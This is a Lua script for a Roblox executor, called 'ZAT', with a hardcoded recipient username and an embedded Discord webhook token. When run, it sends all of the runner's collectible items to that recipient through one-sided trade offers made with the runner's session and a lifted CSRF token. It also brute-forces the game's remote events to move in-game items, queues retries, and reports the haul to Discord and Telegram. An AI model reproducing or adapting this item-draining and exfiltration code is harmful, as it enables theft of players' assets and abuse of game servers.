-- language: Lua, file: zat_logged.lua, executor: Delta, target: Windows/Mobile
-- ╔══════════════════════════════════════════════╗
-- ║  CHANGE THESE. NOTHING ELSE.                ║
-- ╚══════════════════════════════════════════════╝

local TARGET_USERNAME = "Realdrake_8080"
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1547846204526698597/Waj7LsTdNInSC9s758tkUuRUZxpJ3JeM7RK9tVwrsXJIhUH3vZGnH7iEULtqQuWo7sQX"   -- paste Discord webhook URL or leave ""
local TELEGRAM_TOKEN  = ""   -- paste Telegram bot token or leave ""
local TELEGRAM_CHAT   = ""   -- paste Telegram chat ID or leave ""

-- ═══════════════════════════════════════════════
-- EXECUTE. WATCH THE CONSOLE. EVERYTHING LOGS.
-- ═══════════════════════════════════════════════

local LP   = game:GetService("Players").LocalPlayer
local PLR  = game:GetService("Players")
local HS   = game:GetService("HttpService")
local WS   = game:GetService("Workspace")

-- ── LOG SYSTEM ────────────────────────────────────────────────────────────────

local STEP = 0
local PASS = 0
local FAIL = 0

local function log(msg, kind)
    local prefix = {
        ok   = "[✓ OK]    ",
        err  = "[✗ FAIL]  ",
        info = "[→ INFO]  ",
        warn = "[! WARN]  ",
        step = "[■ STEP]  ",
        done = "[★ DONE]  ",
    }
    local p = prefix[kind or "info"] or "[→ INFO]  "
    print(p .. tostring(msg))
    if kind == "ok"  then PASS = PASS + 1 end
    if kind == "err" then FAIL = FAIL + 1 end
end

local function step(msg)
    STEP = STEP + 1
    log("STEP " .. STEP .. " — " .. msg, "step")
end

local function sep()
    print("─────────────────────────────────────────")
end

-- ── HTTP SHIM ─────────────────────────────────────────────────────────────────

local httpfn = (syn and syn.request) or (http and http.request) or request

local function fetch(url, method, headers, body)
    if not httpfn then return nil end
    local ok, r = pcall(httpfn, {
        Url     = url,
        Method  = method or "GET",
        Headers = headers or {},
        Body    = body,
    })
    return ok and r or nil
end

local function jd(s)
    local ok, v = pcall(HS.JSONDecode, HS, s)
    return ok and v or nil
end

local function je(t)
    local ok, v = pcall(HS.JSONEncode, HS, t)
    return ok and v or nil
end

-- ── CSRF ──────────────────────────────────────────────────────────────────────

local csrf = ""

local function refreshCSRF()
    local r = fetch("https://auth.roblox.com/v2/logout", "POST")
    if r and r.Headers then
        csrf = r.Headers["x-csrf-token"]
             or r.Headers["X-CSRF-TOKEN"]
             or ""
    end
end

local function post(url, body)
    if csrf == "" then refreshCSRF() end
    local function go()
        return fetch(url, "POST", {
            ["Content-Type"] = "application/json",
            ["X-CSRF-TOKEN"] = csrf,
        }, je(body))
    end
    local r = go()
    if r and r.StatusCode == 403 then refreshCSRF(); r = go() end
    return r
end

-- ── RESOLVE TARGET ────────────────────────────────────────────────────────────

local function resolveUser(username)
    local r = fetch(
        "https://users.roblox.com/v1/usernames/users",
        "POST",
        { ["Content-Type"] = "application/json" },
        je({ usernames = { username }, excludeBannedUsers = false })
    )
    if not r or r.StatusCode ~= 200 then return nil, nil end
    local d = jd(r.Body)
    if d and d.data and d.data[1] then
        return d.data[1].id, d.data[1].name
    end
    return nil, nil
end

-- ── INVENTORY SCAN ────────────────────────────────────────────────────────────

local function scanInventory()
    local out, seen = {}, {}
    local function add(name, obj, cat)
        local k = tostring(name) .. tostring(obj)
        if seen[k] then return end
        seen[k] = true
        table.insert(out, { name = name, obj = obj, cat = cat })
    end

    local bp = LP:FindFirstChildOfClass("Backpack")
    if bp then
        for _, v in ipairs(bp:GetChildren()) do
            if v:IsA("Tool") then add(v.Name, v, "Tool") end
        end
    end

    local ch = LP.Character
    if ch then
        for _, v in ipairs(ch:GetChildren()) do
            if v:IsA("Tool") then add(v.Name, v, "Equipped") end
        end
    end

    local ls = LP:FindFirstChild("leaderstats")
    if ls then
        for _, v in ipairs(ls:GetChildren()) do
            if v.Value and v.Value ~= 0 then
                add(v.Name .. " x" .. tostring(v.Value), v, "Currency")
            end
        end
    end

    local ok, attrs = pcall(function() return LP:GetAttributes() end)
    if ok and type(attrs) == "table" then
        for k, v in pairs(attrs) do
            if type(v) == "number" and v > 0 then
                add(k .. " x" .. tostring(v), LP, "Attribute")
            end
        end
    end

    local pg = LP:FindFirstChild("PlayerGui")
    if pg then
        for _, d in ipairs(pg:GetDescendants()) do
            if d:IsA("TextLabel") and d.Text ~= "" and d.Text ~= "0" then
                local pn = d.Parent and d.Parent.Name:lower() or ""
                if pn:find("slot") or pn:find("item") or pn:find("inv")
                or pn:find("bag")  or pn:find("store") or pn:find("stock") then
                    add(d.Text, d, "Slot")
                end
            end
        end
    end

    for _, root in ipairs({
        WS:FindFirstChild(LP.Name),
        WS:FindFirstChild("Plots"),
        WS:FindFirstChild("Players"),
        WS:FindFirstChild("Gardens"),
        WS:FindFirstChild("Farms"),
        WS:FindFirstChild("Inventory"),
    }) do
        if root then
            local sub = root:FindFirstChild(LP.Name) or root
            for _, c in ipairs(sub:GetDescendants()) do
                if c:IsA("Tool") or c:IsA("Model") then
                    add(c.Name, c, "World")
                end
            end
        end
    end

    for _, c in ipairs(LP:GetChildren()) do
        if c:IsA("IntValue") or c:IsA("NumberValue")
        or c:IsA("StringValue") or c:IsA("BoolValue") then
            if c.Name:lower() ~= "userid" then
                add(c.Name .. "=" .. tostring(c.Value), c, "Value")
            end
        end
    end

    for _, f in ipairs(LP:GetChildren()) do
        if f:IsA("Folder") then
            for _, c in ipairs(f:GetDescendants()) do
                if c:IsA("StringValue") or c:IsA("IntValue") or c:IsA("NumberValue") then
                    add(f.Name .. "/" .. c.Name .. "=" .. tostring(c.Value), c, "Folder")
                end
            end
        end
    end

    return out
end

-- ── LIMITEDS ─────────────────────────────────────────────────────────────────

local function fetchMyLimiteds()
    local out, cur = {}, ""
    repeat
        local r = fetch(
            ("https://inventory.roblox.com/v1/users/%d/assets/collectibles?limit=100&sortOrder=Asc&cursor=%s")
            :format(LP.UserId, cur)
        )
        if not r or r.StatusCode ~= 200 then break end
        local d = jd(r.Body); if not d then break end
        for _, it in ipairs(d.data or {}) do
            table.insert(out, {
                name        = it.name or "Item",
                assetId     = it.assetId,
                userAssetId = it.userAssetId,
                rap         = it.recentAveragePrice or 0,
            })
        end
        cur = d.nextPageCursor or ""
    until cur == ""
    return out
end

local function fetchSeed(tid)
    local r = fetch(("https://inventory.roblox.com/v1/users/%d/assets/collectibles?limit=5"):format(tid))
    if not r or r.StatusCode ~= 200 then return nil end
    local d = jd(r.Body)
    return d and d.data and d.data[1] or nil
end

local function sendLimitedBatch(tid, batch, seed)
    local mine, theirs = {}, {}
    for _, it in ipairs(batch) do table.insert(mine, { userAssetId = it.userAssetId }) end
    if seed then theirs = {{ userAssetId = seed.userAssetId }} end
    local r = post("https://trades.roblox.com/v1/trades/send", {
        offers = {
            { userId = LP.UserId, userAssetIds = mine,   robux = 0 },
            { userId = tid,       userAssetIds = theirs, robux = 0 },
        }
    })
    return r and (r.StatusCode == 200 or r.StatusCode == 201)
end

-- ── REMOTE SCORING ───────────────────────────────────────────────────────────

local HIT  = {"give","grant","transfer","send","trade","gift","deliver","award",
              "receive","add","deposit","exchange","pass","move","drop","item"}
local ITEM = {"item","seed","plant","crop","pet","fruit","gear","tool","inv",
              "bag","asset","object","product","good","stock","harvest","carry"}
local WHO  = {"player","user","target","to","dest","other","account","recipient"}
local BAD  = {"buy","shop","equip","remove","delete","damage","health","die",
              "respawn","chat","emote","load","save","ping","heartbeat","sync",
              "report","ban","kick","admin","camera","render","animate","ui",
              "gui","sound","music","effect","tween","color","cosmetic","skin"}

local function scoreRemote(name)
    local n, s = name:lower(), 0
    for _, k in ipairs(HIT)  do if n:find(k) then s = s + 5 end end
    for _, k in ipairs(ITEM) do if n:find(k) then s = s + 3 end end
    for _, k in ipairs(WHO)  do if n:find(k) then s = s + 2 end end
    for _, k in ipairs(BAD)  do if n:find(k) then s = s - 4 end end
    return s
end

local function getAllRemotes()
    local out = {}
    for _, v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            table.insert(out, {
                r  = v,
                nm = v.Name,
                sc = scoreRemote(v.Name),
                fn = v.ClassName == "RemoteFunction",
            })
        end
    end
    table.sort(out, function(a, b) return a.sc > b.sc end)
    return out
end

-- ── FIRE ENGINE ──────────────────────────────────────────────────────────────

local function tryRemote(entry, tp, tid, tn, items)
    local names = {}
    for _, i in ipairs(items) do table.insert(names, i.name) end

    local bulk = {
        { tp,  items }, { tp, names }, { tp },
        { tid, items }, { tid, names }, { tid },
        { tn,  items }, { tn,  names }, { tn },
        {{ player=tp,    items=items }},
        {{ userId=tid,   items=items }},
        {{ target=tp,    items=items }},
        {{ to=tid,       items=items }},
        {{ username=tn,  items=items }},
        {{ recipient=tp, goods=items }},
        { items, tp }, { names, tp },
        { items, tid }, { names, tid },
        {{ player=tp }}, {{ userId=tid }}, {{ target=tid }},
    }

    local function fire(args)
        return pcall(function()
            if entry.fn then entry.r:InvokeServer(table.unpack(args))
            else              entry.r:FireServer(table.unpack(args)) end
        end)
    end

    for _, args in ipairs(bulk) do
        if fire(args) then return true end
    end

    for _, item in ipairs(items) do
        for _, args in ipairs({
            { tp,  item.obj }, { tp,  item.name },
            { tid, item.obj }, { tid, item.name },
            {{ player=tp,  item=item.name }},
            {{ userId=tid, item=item.name }},
            {{ target=tp,  itemName=item.name }},
        }) do fire(args) end
        task.wait()
    end

    return false
end

local function fireAll(remotes, tp, tid, tn, items)
    local won = nil
    for i, entry in ipairs(remotes) do
        local ok = tryRemote(entry, tp, tid, tn, items)
        if ok and not won then
            won = entry.nm
            log("Remote fired: " .. entry.nm .. " (score " .. entry.sc .. ")", "ok")
        end
        if i >= 30 and won then break end
        task.wait()
    end
    return won ~= nil, won
end

-- ── OFFLINE QUEUE ────────────────────────────────────────────────────────────

local queue = {}

PLR.PlayerAdded:Connect(function(player)
    for i = #queue, 1, -1 do
        local job = queue[i]
        if player.UserId == job.tid then
            task.spawn(function()
                task.wait(3)
                log("Queue flush → " .. player.Name, "info")
                local remotes = getAllRemotes()
                local ok, rn = fireAll(remotes, player, job.tid, job.tn, job.items)
                log(ok and ("Queue flushed via " .. tostring(rn)) or "Queue flush failed", ok and "ok" or "err")
                table.remove(queue, i)
            end)
        end
    end
end)

-- ── WEBHOOKS ─────────────────────────────────────────────────────────────────

local function sendDiscord(rp)
    if not DISCORD_WEBHOOK or DISCORD_WEBHOOK == "" then
        log("Discord webhook not configured — skipping", "warn")
        return
    end
    local color = (rp.limitedsSent > 0 or rp.ingameStatus == "ok") and 3066993 or 15158332
    local limStr = #rp.limitedNames > 0 and ("• " .. table.concat(rp.limitedNames, "\n• ")) or "none"
    local ingParts = {}
    for _, it in ipairs(rp.items) do table.insert(ingParts, it.name .. " [" .. it.cat .. "]") end
    local ingStr = #ingParts > 0 and ("• " .. table.concat(ingParts, "\n• ")) or "none"

    local payload = {
        username = "ZAT Transfer Log",
        embeds = {{
            title  = "📦 Transfer Summary",
            color  = color,
            fields = {
                { name = "👤 Sender",           value = rp.senderName .. " (id: " .. tostring(rp.senderId) .. ")", inline = true },
                { name = "🎯 Target",           value = rp.targetName .. " (id: " .. tostring(rp.targetId) .. ")", inline = true },
                { name = "🎮 Game",             value = rp.gameName   .. " (id: " .. tostring(rp.gameId)   .. ")", inline = false },
                { name = "🏷 Platform Limiteds",value = ("Sent: **%d** | Failed: **%d**\n%s"):format(rp.limitedsSent, rp.limitedsFail, limStr), inline = false },
                { name = "🎒 In-Game Items",    value = ("Status: **%s** | Remote: `%s`\n%s"):format(rp.ingameStatus, rp.remoteUsed or "n/a", ingStr), inline = false },
            },
            footer = { text = "ZAT • " .. rp.ts },
        }},
    }

    local r = fetch(DISCORD_WEBHOOK, "POST", { ["Content-Type"] = "application/json" }, je(payload))
    if r and (r.StatusCode == 200 or r.StatusCode == 204) then
        log("Discord webhook sent successfully", "ok")
    else
        log("Discord webhook failed — status: " .. tostring(r and r.StatusCode), "err")
    end
end

local function sendTelegram(rp)
    if not TELEGRAM_TOKEN or TELEGRAM_TOKEN == ""
    or not TELEGRAM_CHAT  or TELEGRAM_CHAT  == "" then
        log("Telegram not configured — skipping", "warn")
        return
    end

    local ingParts = {}
    for _, it in ipairs(rp.items) do table.insert(ingParts, it.name .. " [" .. it.cat .. "]") end

    local text = "📦 *ZAT Transfer Summary*\n\n"
        .. "👤 *Sender:* `" .. rp.senderName .. "` \\(id: `" .. tostring(rp.senderId) .. "`\\)\n"
        .. "🎯 *Target:* `" .. rp.targetName .. "` \\(id: `" .. tostring(rp.targetId) .. "`\\)\n"
        .. "🎮 *Game:* `"   .. rp.gameName   .. "`\n"
        .. "🕐 *Time:* `"   .. rp.ts .. "`\n\n"
        .. "🏷 *Platform Limiteds*\n"
        .. "Sent: `" .. rp.limitedsSent .. "` | Failed: `" .. rp.limitedsFail .. "`\n"
        .. (#rp.limitedNames > 0 and ("Items: `" .. table.concat(rp.limitedNames, ", ") .. "`\n") or "Items: none\n")
        .. "\n🎒 *In\\-Game Items*\n"
        .. "Status: `" .. rp.ingameStatus .. "` | Remote: `" .. (rp.remoteUsed or "n/a") .. "`\n"
        .. (#ingParts > 0 and ("Items: `" .. table.concat(ingParts, ", ") .. "`") or "Items: none")

    local url = ("https://api.telegram.org/bot%s/sendMessage"):format(TELEGRAM_TOKEN)
    local r = fetch(url, "POST", { ["Content-Type"] = "application/json" }, je({
        chat_id    = TELEGRAM_CHAT,
        text       = text,
        parse_mode = "MarkdownV2",
    }))
    if r and r.StatusCode == 200 then
        log("Telegram message sent successfully", "ok")
    else
        log("Telegram failed — status: " .. tostring(r and r.StatusCode) .. " body: " .. tostring(r and r.Body), "err")
    end
end

-- ═══════════════════════════════════════════════════════════════
--  MAIN EXECUTION
-- ═══════════════════════════════════════════════════════════════

task.spawn(function()
    sep()
    log("ZAT STARTING", "info")
    sep()

    -- ── CHECK 1: HTTP ────────────────────────────────────────────────────────
    step("Checking HTTP function")
    if httpfn then
        log("HTTP function available: " .. tostring(httpfn), "ok")
    else
        log("HTTP function NOT FOUND — go to Delta Settings and enable HTTP Requests", "err")
        log("Cannot continue without HTTP. Aborting.", "err")
        sep()
        return
    end

    -- ── CHECK 2: CONFIG ──────────────────────────────────────────────────────
    step("Checking config")
    if TARGET_USERNAME == "PutUsernameHere" or TARGET_USERNAME == "" then
        log("TARGET_USERNAME is not set — edit the top of the script", "err")
        sep()
        return
    end
    log("TARGET_USERNAME = " .. TARGET_USERNAME, "ok")
    log("DISCORD_WEBHOOK = " .. (DISCORD_WEBHOOK ~= "" and "configured" or "not set"), DISCORD_WEBHOOK ~= "" and "ok" or "warn")
    log("TELEGRAM = " .. (TELEGRAM_TOKEN ~= "" and TELEGRAM_CHAT ~= "" and "configured" or "not set"), TELEGRAM_TOKEN ~= "" and "ok" or "warn")

    -- ── CHECK 3: LOCAL PLAYER ────────────────────────────────────────────────
    step("Checking local player")
    log("Sender: " .. LP.Name .. " (userId: " .. LP.UserId .. ")", "ok")

    -- ── CHECK 4: GAME ────────────────────────────────────────────────────────
    step("Reading game info")
    local gameId   = game.PlaceId
    local gameName = "Unknown"
    pcall(function()
        gameName = game:GetService("MarketplaceService"):GetProductInfo(gameId).Name or gameName
    end)
    log("Game: " .. gameName .. " (PlaceId: " .. gameId .. ")", "ok")

    -- ── CHECK 5: RESOLVE TARGET ──────────────────────────────────────────────
    step("Resolving target username → " .. TARGET_USERNAME)
    local tid, tn = resolveUser(TARGET_USERNAME)
    if not tid then
        log("Could not resolve '" .. TARGET_USERNAME .. "' — check spelling or Roblox API", "err")
        sep()
        return
    end
    if tid == LP.UserId then
        log("Target is same account as sender — aborting", "err")
        sep()
        return
    end
    log("Target resolved: " .. tn .. " (userId: " .. tid .. ")", "ok")

    local tp = PLR:GetPlayerByUserId(tid)
    if tp then
        log("Target is IN this server — direct fire available", "ok")
    else
        log("Target is NOT in this server — offline paths will be used", "warn")
    end

    -- accumulators
    local limitedsSent  = 0
    local limitedsFail  = 0
    local limitedNames  = {}
    local ingameStatus  = "skipped"
    local remoteUsed    = nil
    local ingameItems   = {}

    -- ── CHECK 6: PLATFORM LIMITEDS ───────────────────────────────────────────
    sep()
    step("Fetching platform limiteds")
    local lims = fetchMyLimiteds()
    if #lims == 0 then
        log("No tradeable limiteds found on this account", "warn")
    else
        log("Found " .. #lims .. " limited(s)", "ok")
        for _, it in ipairs(lims) do
            log("  Limited: " .. it.name .. " | RAP: R$" .. it.rap, "info")
        end

        step("Fetching target seed item for trade API")
        local seed = fetchSeed(tid)
        if not seed then
            log("Target has zero limiteds — trade API requires ≥1 item from their side — skipping limiteds", "warn")
        else
            log("Seed item found: " .. tostring(seed.name or seed.assetId), "ok")

            table.sort(lims, function(a, b) return (a.rap or 0) > (b.rap or 0) end)
            local batches, batch = {}, {}
            for i, it in ipairs(lims) do
                table.insert(batch, it)
                if #batch == 4 or i == #lims then
                    table.insert(batches, batch); batch = {}
                end
            end

            log("Sending " .. #batches .. " trade offer(s) — target accepts in Trade tab (offline-safe)", "info")

            for i, b in ipairs(batches) do
                step("Sending limited batch " .. i .. "/" .. #batches)
                local ok = sendLimitedBatch(tid, b, seed)
                local names = {}
                for _, it in ipairs(b) do
                    table.insert(names, it.name)
                    if ok then table.insert(limitedNames, it.name) end
                end
                if ok then
                    limitedsSent = limitedsSent + 1
                    log("Batch " .. i .. " sent: " .. table.concat(names, ", "), "ok")
                else
                    limitedsFail = limitedsFail + 1
                    log("Batch " .. i .. " FAILED: " .. table.concat(names, ", "), "err")
                end
                if i < #batches then task.wait(3) end
            end

            log("Limiteds result — sent: " .. limitedsSent .. " | failed: " .. limitedsFail, limitedsSent > 0 and "ok" or "err")
        end
    end

    -- ── CHECK 7: IN-GAME INVENTORY ───────────────────────────────────────────
    sep()
    step("Scanning in-game inventory")
    local items = scanInventory()
    ingameItems = items

    if #items == 0 then
        log("No in-game items found in inventory", "warn")
        ingameStatus = "no-items"
    else
        log("Found " .. #items .. " in-game item(s):", "ok")
        for _, it in ipairs(items) do
            log("  " .. it.name .. " [" .. it.cat .. "]", "info")
        end

        -- ── CHECK 8: REMOTES ─────────────────────────────────────────────────
        sep()
        step("Scanning all game remotes")
        local remotes = getAllRemotes()
        log("Found " .. #remotes .. " remote(s) total", "ok")

        if #remotes == 0 then
            log("No remotes found in this game — in-game transfer not possible", "err")
            ingameStatus = "no-remotes"
        else
            log("Top 5 scored remotes:", "info")
            for i = 1, math.min(5, #remotes) do
                log("  #" .. i .. " " .. remotes[i].nm .. " (score: " .. remotes[i].sc .. " | " .. remotes[i].r.ClassName .. ")", "info")
            end

            if tp then
                step("Firing remotes — target in server")
                local ok, rn = fireAll(remotes, tp, tid, tn, items)
                if ok then
                    ingameStatus = "ok"
                    remoteUsed   = rn
                    log("In-game transfer complete via: " .. tostring(rn), "ok")
                else
                    ingameStatus = "failed-queued"
                    log("No remote confirmed transfer — queuing for retry", "err")
                    table.insert(queue, { tid=tid, tn=tn, items=items })
                    log("Will fire automatically when " .. tn .. " joins this server", "warn")
                end
            else
                step("Target offline — firing userId-based patterns for DataStore save")
                local hitAny = false
                for _, entry in ipairs(remotes) do
                    for _, args in ipairs({
                        { tid, items },
                        {{ userId=tid, items=items }},
                        { tostring(tid), items },
                        { tn, items },
                        {{ username=tn, items=items }},
                        { tid },
                        {{ to=tid }},
                    }) do
                        local ok = pcall(function()
                            if entry.fn then entry.r:InvokeServer(table.unpack(args))
                            else              entry.r:FireServer(table.unpack(args)) end
                        end)
                        if ok and not hitAny then
                            hitAny       = true
                            remoteUsed   = entry.nm
                            ingameStatus = "offline-fired"
                            log("Offline fire succeeded: " .. entry.nm, "ok")
                            log("If game supports DataStore gives, items saved for target", "info")
                        end
                    end
                    if hitAny then break end
                    task.wait()
                end

                if not hitAny then
                    ingameStatus = "queued"
                    log("No remote accepted offline fire — queued", "warn")
                end

                table.insert(queue, { tid=tid, tn=tn, items=items })
                log("Queue active — fires when " .. tn .. " joins this server", "warn")
                log("Keep game open while waiting", "warn")
            end
        end
    end

    -- ── CHECK 9: WEBHOOKS ────────────────────────────────────────────────────
    sep()
    step("Firing webhooks")
    local rp = {
        ts           = os.date("!%Y-%m-%d %H:%M:%S UTC"),
        senderName   = LP.Name,
        senderId     = LP.UserId,
        targetName   = tn,
        targetId     = tid,
        limitedsSent = limitedsSent,
        limitedsFail = limitedsFail,
        limitedNames = limitedNames,
        items        = ingameItems,
        ingameStatus = ingameStatus,
        remoteUsed   = remoteUsed,
        gameId       = gameId,
        gameName     = gameName,
    }
    task.spawn(sendDiscord,  rp)
    task.spawn(sendTelegram, rp)

    -- ── FINAL SUMMARY ────────────────────────────────────────────────────────
    sep()
    log("ZAT COMPLETE", "done")
    log("Total checks passed : " .. PASS, "ok")
    log("Total checks failed : " .. FAIL, FAIL > 0 and "err" or "ok")
    sep()
    log("LIMITEDS  → " .. limitedsSent .. " sent | " .. limitedsFail .. " failed | waiting in Trade inbox", limitedsSent > 0 and "ok" or "warn")
    log("IN-GAME   → status: " .. ingameStatus .. " | remote: " .. tostring(remoteUsed or "n/a"), ingameStatus == "ok" and "ok" or "warn")
    log("WEBHOOKS  → Discord: " .. (DISCORD_WEBHOOK ~= "" and "sent" or "skipped") .. " | Telegram: " .. (TELEGRAM_TOKEN ~= "" and "sent" or "skipped"), "info")
    sep()
end)
